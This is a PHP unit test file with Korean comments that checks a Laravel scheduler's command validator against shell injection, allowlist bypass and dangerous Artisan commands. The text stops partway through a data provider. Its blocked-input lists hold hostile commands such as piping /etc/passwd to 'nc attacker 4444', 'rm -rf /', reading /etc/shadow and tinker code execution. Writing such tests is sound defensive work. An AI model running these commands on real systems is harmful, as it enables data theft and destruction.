<?php

namespace Tests\Unit\Support;

use App\Support\ScheduleCommandValidator;
use Illuminate\Support\Facades\Artisan;
use Modules\G7Testing\Console\FakeExtensionScheduleCommand;
use PHPUnit\Framework\Attributes\DataProvider;
use PHPUnit\Framework\Attributes\Test;
use Tests\TestCase;

/**
 * 스케줄 Shell/Artisan command 검증 유틸 테스트.
 *
 * 스케줄 생성 권한만 위임받은 계정이 임의 OS 명령·임의 PHP 코드를 실행하는 경로를
 * 전수 매트릭스로 차단 검증한다 (셸 메타문자 주입, 화이트리스트 우회, 차단목록 우회).
 */
class ScheduleCommandValidatorTest extends TestCase
{
    /**
     * shell 게이트를 켜고 허용 실행 파일을 등록합니다.
     *
     * @param  array<int, string>  $binaries  허용 실행 파일 basename 목록
     */
    private function enableShell(array $binaries = ['backup.sh']): void
    {
        config([
            'schedule_security.shell.enabled' => true,
            'schedule_security.shell.allowed_binaries' => $binaries,
        ]);
    }

    // ========================================================================
    // Shell — 게이트
    // ========================================================================

    /**
     * 게이트가 꺼져 있으면 화이트리스트에 있는 명령도 거부한다 (기본 차단).
     */
    #[Test]
    public function it_blocks_every_shell_command_when_the_gate_is_disabled(): void
    {
        config([
            'schedule_security.shell.enabled' => false,
            'schedule_security.shell.allowed_binaries' => ['backup.sh'],
        ]);

        $this->assertFalse(ScheduleCommandValidator::isShellCommandAllowed('backup.sh'));
    }

    /**
     * 게이트가 켜져 있어도 화이트리스트가 비어 있으면 모두 거부한다.
     */
    #[Test]
    public function it_blocks_every_shell_command_when_the_whitelist_is_empty(): void
    {
        $this->enableShell([]);

        $this->assertFalse(ScheduleCommandValidator::isShellCommandAllowed('backup.sh'));
    }

    // ========================================================================
    // Shell — 화이트리스트
    // ========================================================================

    /**
     * 게이트 on + 화이트리스트 등록 실행 파일은 허용한다 (정상 운영 경로).
     *
     * @param  string  $command  허용되어야 하는 command
     */
    #[Test]
    #[DataProvider('allowedShellCommandProvider')]
    public function it_allows_whitelisted_shell_binaries(string $command): void
    {
        $this->enableShell(['backup.sh']);

        $this->assertTrue(
            ScheduleCommandValidator::isShellCommandAllowed($command),
            "허용되어야 하는 명령이 차단됨: {$command}"
        );
    }

    /**
     * 화이트리스트에 없는 실행 파일은 거부한다.
     *
     * @param  string  $command  차단되어야 하는 command
     * @param  string  $reason  차단 사유 (실패 메시지용)
     */
    #[Test]
    #[DataProvider('blockedShellCommandProvider')]
    public function it_blocks_shell_commands_outside_the_whitelist(string $command, string $reason): void
    {
        $this->enableShell(['backup.sh']);

        $this->assertFalse(
            ScheduleCommandValidator::isShellCommandAllowed($command),
            "차단되어야 하는 명령이 통과함 ({$reason}): {$command}"
        );
    }

    // ========================================================================
    // Shell — 토큰화 (셸 미경유 실행 가능 여부)
    // ========================================================================

    /**
     * 셸 메타문자가 섞인 명령은 토큰화를 거부한다 (인자배열 실행 불가 → 실행 차단).
     *
     * @param  string  $command  메타문자가 포함된 command
     * @param  string  $reason  차단 사유 (실패 메시지용)
     */
    #[Test]
    #[DataProvider('shellMetacharacterCommandProvider')]
    public function it_refuses_to_tokenize_commands_containing_shell_metacharacters(string $command, string $reason): void
    {
        $this->assertNull(
            ScheduleCommandValidator::tokenizeShellCommand($command),
            "토큰화가 거부되어야 하는 명령이 통과함 ({$reason}): {$command}"
        );
    }

    /**
     * 메타문자 없는 명령은 공백 기준 인자 배열로 토큰화한다.
     */
    #[Test]
    public function it_tokenizes_a_plain_command_into_an_argument_array(): void
    {
        $this->assertSame(
            ['backup.sh', '--full', '/var/data'],
            ScheduleCommandValidator::tokenizeShellCommand('backup.sh  --full   /var/data')
        );
    }

    /**
     * 빈 문자열·공백만 있는 명령은 토큰화를 거부한다.
     */
    #[Test]
    public function it_refuses_to_tokenize_a_blank_command(): void
    {
        $this->assertNull(ScheduleCommandValidator::tokenizeShellCommand('   '));
    }

    // ========================================================================
    // Shell — 인터프리터 정책 (KVE-2026-1653)
    // ========================================================================

    /**
     * 인터프리터에 인라인 코드/명령을 넘기는 형태는 화이트리스트에 등재돼 있어도 차단한다.
     *
     * KVE-2026-1653 본체: 운영자가 `bash` 를 화이트리스트에 등록하면 `bash -c id` 가
     * 통과해 임의 OS 명령이 실행됐다. 스크립트 자리(첫 인자)가 하이픈이면 인라인 코드 플래그다.
     *
     * @param  string  $command  인라인 코드/명령을 넘기는 command
     *
     * @scenario command_class=inline_code, enforcement_point=validator_unit
     *
     * @effects inline_code_flags_rejected
     */
    #[Test]
    #[DataProvider('inlineCodeShellCommandProvider')]
    public function it_blocks_inline_code_through_interpreters_even_when_allowlisted(string $command): void
    {
        $this->enableShell(self::interpreterBinaries());

        $verdict = ScheduleCommandValidator::inspectShellCommand($command);

        $this->assertFalse($verdict['allowed'], "인라인 코드가 통과함: {$command}");
        $this->assertSame(ScheduleCommandValidator::SHELL_REASON_INLINE_CODE, $verdict['reason']);
    }

    /**
     * 변형 표기(Windows `.exe` / 버전 접미사)로 등재된 인터프리터도 분류를 비켜가지 못한다.
     *
     * 분류 목록(`script_interpreters`/`reject_binaries`)은 기본 이름만 담으므로,
     * 정확 일치 분류 시절에는 운영자가 `python.exe`·`python3.12` 로 등재하면
     * "일반 스크립트 — 통과" 분기를 타 인라인 코드 차단이 통째로 무력화됐다.
     *
     * @param  string  $command  변형 표기 인터프리터로 인라인 코드를 넘기는 command
     * @param  string  $binary  화이트리스트에 등재한 변형 표기
     * @param  string  $expectedReason  기대 거부 사유
     *
     * @scenario command_class=inline_code, enforcement_point=validator_unit
     *
     * @effects inline_code_flags_rejected
     */
    #[Test]
    #[DataProvider('variantInterpreterShellCommandProvider')]
    public function it_classifies_variant_interpreter_names_before_gating(string $command, string $binary, string $expectedReason): void
    {
        $this->enableShell([$binary]);

        $verdict = ScheduleCommandValidator::inspectShellCommand($command);

        $this->assertFalse($verdict['allowed'], "변형 표기 인터프리터가 통과함: {$command}");
        $this->assertSame($expectedReason, $verdict['reason']);
    }

    /**
     * 변형 표기로 등재된 인터프리터의 절대경로 스크립트 실행은 그대로 통과한다 (과차단 회귀 가드).
     *
     * @scenario command_class=script_ok, enforcement_point=validator_unit
     *
     * @effects interpreter_script_files_still_run
     */
    #[Test]
    public function it_allows_variant_named_interpreters_running_absolute_scripts(): void
    {
        $this->enableShell(['python.exe']);

        $verdict = ScheduleCommandValidator::inspectShellCommand('python.exe /opt/scripts/job.py');

        $this->assertTrue($verdict['allowed'], '변형 표기 인터프리터의 정상 스크립트 실행이 차단됨');
        $this->assertNull($verdict['reason']);
    }

    /**
     * 인터프리터 + 절대경로 스크립트 파일은 통과한다 (범용 크론 기능 회귀 가드).
     *
     * @param  string  $command  스크립트 파일을 실행하는 command
     *
     * @scenario command_class=script_ok, enforcement_point=validator_unit
     *
     * @effects interpreter_script_files_still_run
     */
    #[Test]
    #[DataProvider('interpreterScriptShellCommandProvider')]
    public function it_allows_interpreters_running_absolute_path_scripts(string $command): void
    {
        $this->enableShell(self::interpreterBinaries());

        $verdict = ScheduleCommandValidator::inspectShellCommand($command);

        $this->assertTrue($verdict['allowed'], "정상 스크립트 실행이 차단됨: {$command}");
        $this->assertNull($verdict['reason']);
    }

    /**
     * 인터프리터 뒤 스크립트 자리가 artisan 이면 차단한다 (Artisan 축 우회 방지).
     *
     * @param  string  $command  artisan 을 스크립트로 넘기는 command
     *
     * @scenario command_class=artisan_bypass, enforcement_point=validator_unit
     *
     * @effects artisan_via_shell_rejected
     */
    #[Test]
    #[DataProvider('artisanBypassShellCommandProvider')]
    public function it_blocks_artisan_as_the_interpreter_script(string $command): void
    {
        $this->enableShell(self::interpreterBinaries());

        $verdict = ScheduleCommandValidator::inspectShellCommand($command);

        $this->assertFalse($verdict['allowed'], "artisan 우회가 통과함: {$command}");
        $this->assertSame(ScheduleCommandValidator::SHELL_REASON_INTERPRETER, $verdict['reason']);
    }

    /**
     * 완전 거부형 실행기는 화이트리스트에 등재돼 있어도 차단한다.
     *
     * env/awk/make/xargs/sudo/busybox 등은 첫 인자가 코드·감싼 명령이라 "스크립트 파일"
     * 모델이 성립하지 않는다.
     *
     * @param  string  $command  완전 거부형 command
     *
     * @scenario command_class=reject_binary, enforcement_point=validator_unit
     *
     * @effects reject_binaries_blocked_even_when_allowlisted
     */
    #[Test]
    #[DataProvider('rejectBinaryShellCommandProvider')]
    public function it_blocks_reject_binaries_even_when_allowlisted(string $command): void
    {
        $this->enableShell(self::interpreterBinaries());

        $verdict = ScheduleCommandValidator::inspectShellCommand($command);

        $this->assertFalse($verdict['allowed'], "완전 거부형이 통과함: {$command}");
        $this->assertSame(ScheduleCommandValidator::SHELL_REASON_INTERPRETER, $verdict['reason']);
    }

    /**
     * 인터프리터 뒤 스크립트 경로 형태 위반(상대경로 / `..` / `#`)은 차단한다.
     *
     * @param  string  $command  경로 형태 위반 command
     *
     * @scenario command_class=script_path, enforcement_point=validator_unit
     *
     * @effects script_path_traversal_rejected
     */
    #[Test]
    #[DataProvider('scriptPathShellCommandProvider')]
    public function it_blocks_unsafe_interpreter_script_paths(string $command): void
    {
        $this->enableShell(self::interpreterBinaries());

        $verdict = ScheduleCommandValidator::inspectShellCommand($command);

        $this->assertFalse($verdict['allowed'], "안전하지 않은 경로가 통과함: {$command}");
        $this->assertSame(ScheduleCommandValidator::SHELL_REASON_SCRIPT_PATH, $verdict['reason']);
    }

    /**
     * 스크립트 없이 인터프리터만 등록하면(REPL/셸 기동) 차단한다.
     *
     * @param  string  $command  인자 없는 인터프리터 command
     *
     * @scenario command_class=no_script, enforcement_point=validator_unit
     *
     * @effects interpreter_without_script_rejected
     */
    #[Test]
    #[DataProvider('noScriptShellCommandProvider')]
    public function it_blocks_interpreters_without_a_script(string $command): void
    {
        $this->enableShell(self::interpreterBinaries());

        $verdict = ScheduleCommandValidator::inspectShellCommand($command);

        $this->assertFalse($verdict['allowed'], "인자 없는 인터프리터가 통과함: {$command}");
        $this->assertSame(ScheduleCommandValidator::SHELL_REASON_INTERPRETER, $verdict['reason']);
    }

    /**
     * 인터프리터가 아닌 일반 스크립트는 종전처럼 통과한다 (기존 계약 보존 회귀 가드).
     *
     * @param  string  $command  일반 스크립트 command
     *
     * @scenario command_class=legit_plain_script, enforcement_point=validator_unit
     *
     * @effects plain_scripts_still_run_without_path_restrictions
     */
    #[Test]
    #[DataProvider('plainScriptShellCommandProvider')]
    public function it_still_allows_plain_non_interpreter_scripts(string $command): void
    {
        $this->enableShell(['backup.sh']);

        $verdict = ScheduleCommandValidator::inspectShellCommand($command);

        $this->assertTrue($verdict['allowed'], "일반 스크립트가 차단됨: {$command}");
        $this->assertNull($verdict['reason']);
    }

    /**
     * 게이트가 꺼져 있으면 disabled 사유를 돌려준다.
     *
     * @scenario command_class=inline_code, enforcement_point=validator_unit
     *
     * @effects rejection_reason_is_reported_per_category
     */
    #[Test]
    public function it_reports_disabled_when_the_shell_gate_is_off(): void
    {
        config([
            'schedule_security.shell.enabled' => false,
            'schedule_security.shell.allowed_binaries' => ['bash'],
        ]);

        $verdict = ScheduleCommandValidator::inspectShellCommand('bash /app/x.sh');

        $this->assertFalse($verdict['allowed']);
        $this->assertSame(ScheduleCommandValidator::SHELL_REASON_DISABLED, $verdict['reason']);
    }

    /**
     * 화이트리스트 밖 명령은 not_allowlisted 사유를 돌려준다.
     *
     * @scenario command_class=inline_code, enforcement_point=validator_unit
     *
     * @effects rejection_reason_is_reported_per_category
     */
    #[Test]
    public function it_reports_not_allowlisted_for_unregistered_binaries(): void
    {
        $this->enableShell(['backup.sh']);

        $verdict = ScheduleCommandValidator::inspectShellCommand('bash -c id');

        $this->assertFalse($verdict['allowed']);
        $this->assertSame(ScheduleCommandValidator::SHELL_REASON_NOT_ALLOWED, $verdict['reason']);
    }

    /**
     * 메타문자가 섞인 명령은 metacharacter 사유를 돌려준다.
     *
     * @scenario command_class=reject_binary, enforcement_point=validator_unit
     *
     * @effects rejection_reason_is_reported_per_category
     */
    #[Test]
    public function it_reports_metacharacter_for_commands_with_shell_metacharacters(): void
    {
        $this->enableShell(self::interpreterBinaries());

        $verdict = ScheduleCommandValidator::inspectShellCommand('awk \'BEGIN{system("id")}\'');

        $this->assertFalse($verdict['allowed']);
        $this->assertSame(ScheduleCommandValidator::SHELL_REASON_METACHARACTER, $verdict['reason']);
    }

    // ========================================================================
    // Artisan — 차단목록
    // ========================================================================

    /**
     * 차단목록에 오른 artisan 명령은 거부한다 (코드 실행형·파괴적 명령).
     *
     * @param  string  $command  차단되어야 하는 command
     *
     * @scenario command_class=denylisted, enforcement_point=validator_unit
     *
     * @effects denylist_blocks_destructive_and_code_executing_commands
     */
    #[Test]
    #[DataProvider('deniedArtisanCommandProvider')]
    public function it_blocks_denylisted_artisan_commands(string $command): void
    {
        $this->assertFalse(
            ScheduleCommandValidator::isArtisanCommandAllowed($command),
            "차단되어야 하는 artisan 명령이 통과함: {$command}"
        );
    }

    /**
     * 차단목록에 없는 artisan 명령은 허용한다 (기본 허용).
     *
     * @param  string  $command  허용되어야 하는 command
     *
     * @scenario command_class=core_allowlisted, enforcement_point=validator_unit
     *
     * @effects allowlisted_maintenance_commands_still_run
     */
    #[Test]
    #[DataProvider('allowedArtisanCommandProvider')]
    public function it_allows_artisan_commands_that_are_not_denylisted(string $command): void
    {
        $this->assertTrue(
            ScheduleCommandValidator::isArtisanCommandAllowed($command),
            "허용되어야 하는 artisan 명령이 차단됨: {$command}"
        );
    }

    /**
     * artisan 명령명은 첫 토큰으로 추출한다.
     */
    #[Test]
    public function it_extracts_the_artisan_command_name_from_the_first_token(): void
    {
        $this->assertSame('cache:clear', ScheduleCommandValidator::extractArtisanCommandName('  cache:clear --tags=a '));
        $this->assertNull(ScheduleCommandValidator::extractArtisanCommandName('   '));
    }

    // ========================================================================
    // Artisan — 파서 분기 (KVE-2026-1679 추가 발견분)
    // ========================================================================

    /**
     * 검증기가 본 이름과 Symfony 가 해석하는 이름이 갈리는 입력은 거부한다.
     *
     * 검증기는 `preg_split` 첫 토큰을 명령명으로 봤지만 실행부는 문자열 전체를
     * StringInput 으로 재파싱했다. 따옴표·백슬래시·선행 옵션 한 쌍이면 차단목록에 있는
     * `tinker` 가 그대로 실행됐다. 판정이 거부라는 것뿐 아니라, 명령명 추출이
     * **다른 이름을 돌려주지 않는 것**까지 단언한다 — 이름이 돌아오면 그 이름으로 실행하는
     * 호출부가 언제든 다시 생길 수 있다.
     *
     * @param  string  $command  파서 분기를 유발하는 command
     * @param  string  $symfonyName  Symfony 가 실제로 해석하는 명령명
     *
     * @scenario command_class=parser_divergent, enforcement_point=validator_unit
     *
     * @effects parser_divergent_input_is_rejected, extracted_name_equals_executed_name
     */
    #[Test]
    #[DataProvider('parserDivergenceArtisanCommandProvider')]
    public function it_blocks_artisan_commands_whose_parsed_name_diverges(string $command, string $symfonyName): void
    {
        $this->assertFalse(
            ScheduleCommandValidator::isArtisanCommandAllowed($command),
            "파서 분기 입력이 통과함: {$command}"
        );

        $this->assertNull(
            ScheduleCommandValidator::extractArtisanCommandName($command),
            "정규 형태가 아닌 입력에서 명령명이 반환됨 (Symfony 는 '{$symfonyName}' 으로 해석): {$command}"
        );

        $this->assertNull(
            ScheduleCommandValidator::resolveArtisanCommand($command),
            "파서 분기 입력에 실행 계획이 만들어짐: {$command}"
        );
    }

    /**
     * 파서 분기 입력의 거부 사유는 형식 오류로 보고된다.
     *
     * @scenario command_class=malformed, enforcement_point=validator_unit
     *
     * @effects rejection_reason_is_reported_per_category
     */
    #[Test]
    public function it_reports_malformed_as_the_reason_for_parser_divergent_input(): void
    {
        $verdict = ScheduleCommandValidator::inspectArtisanCommand('"tinker" --execute=1');

        $this->assertFalse($verdict['allowed']);
        $this->assertSame(ScheduleCommandValidator::ARTISAN_REASON_MALFORMED, $verdict['reason']);
        $this->assertNull($verdict['name']);
    }

    // ========================================================================
    // Artisan — 허용목록 / 옵션 / 인자
    // ========================================================================

    /**
     * 허용목록에 없는 명령은 무해하더라도 거부한다 (허용목록 전환의 증명).
     *
     * @param  string  $command  허용목록 밖 command
     *
     * @scenario command_class=core_not_allowlisted, enforcement_point=validator_unit
     *
     * @effects commands_outside_the_allowlist_are_rejected
     */
    #[Test]
    #[DataProvider('notAllowlistedArtisanCommandProvider')]
    public function it_blocks_artisan_commands_outside_the_allowlist(string $command): void
    {
        $verdict = ScheduleCommandValidator::inspectArtisanCommand($command);

        $this->assertFalse($verdict['allowed'], "허용목록 밖 명령이 통과함: {$command}");
        $this->assertSame(ScheduleCommandValidator::ARTISAN_REASON_NOT_ALLOWED, $verdict['reason']);
    }

    /**
     * 허용된 명령이라도 선언되지 않은 옵션·위치 인자·단축 옵션은 거부한다.
     *
     * @param  string  $command  차단되어야 하는 command
     * @param  string  $reason  기대 거부 사유 코드
     *
     * @scenario command_class=core_allowlisted, enforcement_point=validator_unit
     *
     * @effects undeclared_options_and_positional_arguments_are_rejected
     */
    #[Test]
    #[DataProvider('blockedOptionArtisanCommandProvider')]
    public function it_blocks_allowlisted_commands_with_denied_usage(string $command, string $reason): void
    {
        $verdict = ScheduleCommandValidator::inspectArtisanCommand($command);

        $this->assertFalse($verdict['allowed'], "거부되어야 하는 사용법이 통과함: {$command}");
        $this->assertSame($reason, $verdict['reason'], "거부 사유가 다름: {$command}");
    }

    /**
     * 허용된 명령은 (명령명, 인자배열) 실행 계획으로 변환된다.
     *
     * 이 배열을 `Artisan::call()` 에 넘겨야 StringInput 재파싱 경로가 사라진다.
     *
     * @scenario command_class=core_allowlisted, enforcement_point=validator_unit
     *
     * @effects allowed_command_resolves_to_name_and_parameter_array
     */
    #[Test]
    public function it_returns_the_execution_plan_for_allowed_commands(): void
    {
        $this->assertSame(
            ['name' => 'queue:work', 'parameters' => ['--stop-when-empty' => true, '--max-time' => '300']],
            ScheduleCommandValidator::resolveArtisanCommand('queue:work --stop-when-empty --max-time=300')
        );

        $this->assertSame(
            ['name' => 'cache:clear', 'parameters' => []],
            ScheduleCommandValidator::resolveArtisanCommand('cache:clear')
        );
    }

    /**
     * 차단목록은 허용목록보다 먼저 평가된다 (최종 거부권).
     *
     * 허용목록에 올라 있어도 차단목록에 있으면 거부되어야 한다 — 확장이 코어 명령 이름을
     * 가로채 등록하는 경우를 같은 규칙으로 막기 위함이다.
     *
     * @scenario command_class=denylisted, enforcement_point=validator_unit
     *
     * @effects denylist_is_evaluated_before_the_allowlist
     */
    #[Test]
    public function it_evaluates_the_denylist_before_the_allowlist(): void
    {
        config(['schedule_security.artisan.denylist' => ['cache:clear']]);

        $verdict = ScheduleCommandValidator::inspectArtisanCommand('cache:clear');

        $this->assertFalse($verdict['allowed']);
        $this->assertSame(ScheduleCommandValidator::ARTISAN_REASON_DENIED, $verdict['reason']);
    }

    /**
     * `make:` 접두사는 41개 명령을 개별 나열 없이 일괄 차단한다.
     *
     * @scenario command_class=code_generating, enforcement_point=validator_unit
     *
     * @effects make_prefix_blocks_all_code_generating_commands
     */
    #[Test]
    public function it_blocks_every_command_matching_a_denylisted_prefix(): void
    {
        foreach (['make:migration', 'make:command', 'make:controller'] as $command) {
            $verdict = ScheduleCommandValidator::inspectArtisanCommand($command);

            $this->assertFalse($verdict['allowed'], "접두사 차단이 적용되지 않음: {$command}");
            $this->assertSame(ScheduleCommandValidator::ARTISAN_REASON_DENIED, $verdict['reason']);
        }
    }

    // ========================================================================
    // Artisan — 확장 소유 명령 계층
    // ========================================================================

    /**
     * 게이트가 켜져 있으면 설치된 확장이 소유한 명령을 자동으로 허용한다.
     *
     * 이름 패턴이 아니라 등록된 명령 인스턴스의 클래스 네임스페이스로 판정하므로,
     * `{확장}:{작업}` 형태를 따르지 않는 확장 명령도 함께 허용된다.
     *
     * @scenario command_class=extension_owned, enforcement_point=validator_unit
     *
     * @effects extension_owned_commands_are_allowed_by_namespace
     */
    #[Test]
    public function it_allows_commands_owned_by_installed_extensions(): void
    {
        $command = $this->registerExtensionCommand();

        $this->assertTrue(
            ScheduleCommandValidator::isArtisanCommandAllowed($command),
            "확장 소유 명령이 차단됨: {$command}"
        );
    }

    /**
     * 게이트를 끄면 확장 소유 명령도 거부된다 (설정으로 좁힐 수 있어야 한다).
     *
     * @scenario command_class=extension_owned, enforcement_point=validator_unit
     *
     * @effects extension_gate_can_be_turned_off
     */
    #[Test]
    public function it_blocks_extension_commands_when_the_gate_is_disabled(): void
    {
        $command = $this->registerExtensionCommand();

        config(['schedule_security.artisan.allow_extension_commands' => false]);

        $verdict = ScheduleCommandValidator::inspectArtisanCommand($command);

        $this->assertFalse($verdict['allowed'], "게이트를 껐는데 확장 명령이 통과함: {$command}");
        $this->assertSame(ScheduleCommandValidator::ARTISAN_REASON_NOT_ALLOWED, $verdict['reason']);
    }

    /**
     * 확장 소유 명령이라도 자기 정의에 없는 옵션은 거부한다.
     *
     * @scenario command_class=extension_owned, enforcement_point=validator_unit
     *
     * @effects extension_commands_only_accept_their_own_options
     */
    #[Test]
    public function it_blocks_undefined_options_on_extension_commands(): void
    {
        $command = $this->registerExtensionCommand();

        $verdict = ScheduleCommandValidator::inspectArtisanCommand($command.' --g7-not-a-real-option');

        $this->assertFalse($verdict['allowed']);
        $this->assertSame(ScheduleCommandValidator::ARTISAN_REASON_OPTION, $verdict['reason']);
    }

    /**
     * Artisan 에 커맨드가 등록되지 않은 문맥(HTTP 요청)에서도, 활성 프로바이더가
     * `$commands` 로 선언한 확장 소유 명령은 자동 허용된다.
     *
     * 실제 확장 프로바이더는 `runningInConsole()` 일 때만 커맨드를 등록하므로,
     * 관리자 화면의 스케줄 저장 검증(HTTP)에서는 `Artisan::all()` 에 확장 커맨드가
     * 없다. 등록 인스턴스가 없으면 프로바이더 선언(클래스 네임스페이스 + 실제 명령명
     * 대조)을 폴백으로 해석해야 한다 — 없으면 "설치된 확장 명령 자동 허용" 약속이
     * 웹 저장 경로에서 통째로 동작하지 않는다 (7.0.7 검수 발견).
     *
     * @scenario command_class=extension_owned, enforcement_point=validator_unit
     *
     * @effects extension_owned_commands_resolved_without_console_registration
     */
    #[Test]
    public function it_allows_provider_declared_extension_commands_without_console_registration(): void
    {
        require_once __DIR__.'/../../Fixtures/Extension/FakeExtensionScheduleCommand.php';
        require_once __DIR__.'/../../Fixtures/Extension/FakeExtensionScheduleServiceProvider.php';

        // Artisan::registerCommand 를 호출하지 않는다 — HTTP 문맥 재현.
        $this->app->register(\Modules\G7Testing\Providers\FakeExtensionScheduleServiceProvider::class);

        $verdict = ScheduleCommandValidator::inspectArtisanCommand('g7-testing-fake-extension-command --scope=all');

        $this->assertTrue($verdict['allowed'], '프로바이더 선언 확장 명령이 HTTP 문맥에서 거부됨');
        $this->assertSame('g7-testing-fake-extension-command', $verdict['name']);

        // 자기 정의에 없는 옵션은 같은 폴백 경로에서도 거부되어야 한다.
        $optionVerdict = ScheduleCommandValidator::inspectArtisanCommand('g7-testing-fake-extension-command --g7-not-a-real-option');
        $this->assertFalse($optionVerdict['allowed']);
        $this->assertSame(ScheduleCommandValidator::ARTISAN_REASON_OPTION, $optionVerdict['reason']);
    }

    /**
     * 확장 네임스페이스를 비워도 코어 허용목록은 그대로 동작한다 (계층 독립성).
     *
     * @scenario command_class=core_allowlisted, enforcement_point=validator_unit
     *
     * @effects extension_gate_can_be_turned_off
     */
    #[Test]
    public function it_keeps_core_allowlist_working_without_extension_namespaces(): void
    {
        config(['schedule_security.artisan.extension_namespaces' => []]);

        $this->assertTrue(ScheduleCommandValidator::isArtisanCommandAllowed('cache:clear'));
    }

    // ========================================================================
    // Artisan — config 불변식
    // ========================================================================

    /**
     * 허용목록과 차단목록은 겹치지 않아야 한다.
     *
     * 겹치면 거부권이 허용목록 항목을 조용히 무력화해, 설정만 보고는 무엇이 실행 가능한지
     * 알 수 없게 된다.
     *
     * @scenario command_class=core_allowlisted, enforcement_point=validator_unit
     *
     * @effects allowlist_and_denylist_stay_disjoint
     */
    #[Test]
    public function it_keeps_the_allowlist_and_denylist_disjoint(): void
    {
        $allowlist = array_map('strtolower', array_keys((array) config('schedule_security.artisan.allowlist')));
        $denylist = array_map('strtolower', (array) config('schedule_security.artisan.denylist'));

        $this->assertSame([], array_values(array_intersect($allowlist, $denylist)));

        foreach ((array) config('schedule_security.artisan.denylist_prefixes') as $prefix) {
            foreach ($allowlist as $name) {
                $this->assertStringStartsNotWith(
                    strtolower((string) $prefix),
                    $name,
                    "차단 접두사가 허용목록 항목을 무력화함: {$name}"
                );
            }
        }
    }

    /**
     * 허용목록의 명령과 옵션은 실제로 등록된 시그니처에 존재해야 한다.
     *
     * 오타나 시그니처 변경으로 허용 옵션이 실체와 어긋나면, 정상 운영 스케줄이
     * 저장 시점에 거부되거나 반대로 존재하지 않는 옵션이 허용된 것처럼 보인다.
     *
     * @scenario command_class=core_allowlisted, enforcement_point=validator_unit
     *
     * @effects allowlist_matches_real_command_signatures
     */
    #[Test]
    public function it_keeps_the_allowlist_in_sync_with_real_command_signatures(): void
    {
        $registered = Artisan::all();

        foreach ((array) config('schedule_security.artisan.allowlist') as $name => $spec) {
            $this->assertArrayHasKey($name, $registered, "허용목록에 없는 명령이 등재됨: {$name}");

            $definition = $registered[$name]->getDefinition();

            foreach ((array) ($spec['options'] ?? []) as $option) {
                $this->assertTrue(
                    $definition->hasOption($option),
                    "허용 옵션이 실제 시그니처에 없음: {$name} --{$option}"
                );
            }
        }
    }

    /**
     * 확장 소유 명령 계층 검증에 쓸 명령을 레지스트리에 등록하고 그 이름을 돌려줍니다.
     *
     * 설치된 확장 중 하나를 골라 쓰면 확장 구성에 따라 테스트가 조용히 skip 되어
     * 계층 자체가 검증되지 않는다. `Modules\` 네임스페이스의 픽스처를 실제 레지스트리에
     * 등록해 판정 결과를 고정한다 — 판정은 이름이 아니라 등록된 인스턴스의
     * 클래스 네임스페이스로 이뤄지므로 이 등록이 실제 확장과 동일한 경로를 탄다.
     */
    private function registerExtensionCommand(): string
    {
        require_once __DIR__.'/../../Fixtures/Extension/FakeExtensionScheduleCommand.php';

        $command = new FakeExtensionScheduleCommand;

        Artisan::registerCommand($command);

        return $command->getName();
    }

    // ========================================================================
    // Data Providers
    // ========================================================================

    /**
     * 허용되어야 하는 shell command 목록.
     *
     * @return array<string, array{string}>
     */
    public static function allowedShellCommandProvider(): array
    {
        return [
            '실행 파일 단독' => ['backup.sh'],
            '인자 포함' => ['backup.sh --full /var/data'],
            '절대경로 (basename 일치)' => ['/usr/local/bin/backup.sh --full'],
            '앞뒤 공백' => ['  backup.sh  '],
        ];
    }

    /**
     * 차단되어야 하는 shell command 목록.
     *
     * @return array<string, array{string, string}>
     */
    public static function blockedShellCommandProvider(): array
    {
        return [
            '화이트리스트 외 명령' => ['id', '보고서 주 시나리오 — 임의 명령 실행'],
            '화이트리스트 외 절대경로' => ['/bin/sh', '셸 자체 실행'],
            '접두사 확장 우회' => ['backup.sh.evil', 'basename 완전 일치가 아님'],
            '접미사 확장 우회' => ['evil-backup.sh', 'basename 완전 일치가 아님'],
            '체이닝으로 화이트리스트 위장' => ['backup.sh; id', '메타문자 — 토큰화 거부'],
            '파이프로 화이트리스트 위장' => ['backup.sh | nc attacker 4444', '메타문자 — 토큰화 거부'],
            '명령치환으로 화이트리스트 위장' => ['backup.sh $(id)', '메타문자 — 토큰화 거부'],
            '빈 명령' => ['', '빈 문자열'],
        ];
    }

    /**
     * 셸 해석을 유발하는 메타문자가 포함된 command 목록.
     *
     * @return array<string, array{string, string}>
     */
    public static function shellMetacharacterCommandProvider(): array
    {
        return [
            '세미콜론 체이닝' => ['backup.sh; rm -rf /', '세미콜론'],
            '파이프' => ['cat /etc/passwd | nc attacker 4444', '파이프'],
            '백그라운드 실행' => ['backup.sh & id', '앰퍼샌드'],
            '명령치환 $()' => ['echo $(id)', '달러 + 괄호'],
            '명령치환 백틱' => ['echo `id`', '백틱'],
            '출력 리다이렉션' => ['backup.sh > /etc/crontab', '리다이렉션'],
            '입력 리다이렉션' => ['backup.sh < /etc/shadow', '리다이렉션'],
            '와일드카드' => ['rm -rf /var/*', '글롭'],
            '따옴표' => ['backup.sh "a b"', '따옴표 — 순진한 토큰화 불가'],
            '개행 주입' => ["backup.sh\nid", '개행'],
        ];
    }

    /**
     * 차단되어야 하는 artisan command 목록.
     *
     * @return array<string, array{string}>
     */
    public static function deniedArtisanCommandProvider(): array
    {
        return [
            'tinker — 임의 PHP 실행' => ['tinker --execute=system("id");'],
            'tinker 단독' => ['tinker'],
            '대소문자 우회' => ['TINKER --execute=1'],
            'db:wipe — 파괴적' => ['db:wipe'],
            'migrate:fresh — 파괴적' => ['migrate:fresh --seed'],
            'migrate:reset' => ['migrate:reset'],
            'migrate:rollback' => ['migrate:rollback'],
            'key:generate' => ['key:generate'],
            'env:decrypt' => ['env:decrypt'],
            'schedule:run' => ['schedule:run'],
            '빈 명령' => [''],
            // 보고서 2단계 체인 — 코드 생성 후 실행
            'make:migration — 접두사 차단' => ['make:migration evil --create=x --path=/tmp/g7 --realpath'],
            'migrate — 임의 경로 실행' => ['migrate --path=/tmp/g7 --realpath --force'],
            'db:seed — 임의 클래스 실행' => ['db:seed --class=Evil'],
            'test' => ['test'],
            'serve' => ['serve'],
            'core:update' => ['core:update'],
            'extension:composer-install' => ['extension:composer-install'],
            'playwright:issue-token' => ['playwright:issue-token'],
            'invoke-serialized-closure' => ['invoke-serialized-closure'],
            'stub:publish' => ['stub:publish'],
            'vendor:publish' => ['vendor:publish'],
            'migrate:refresh — 기존 목록 누락분' => ['migrate:refresh'],
        ];
    }

    /**
     * 허용되어야 하는 artisan command 목록 (정상 운영 명령).
     *
     * @return array<string, array{string}>
     */
    public static function allowedArtisanCommandProvider(): array
    {
        return [
            'cache:clear' => ['cache:clear'],
            '인자 포함' => ['queue:work --stop-when-empty'],
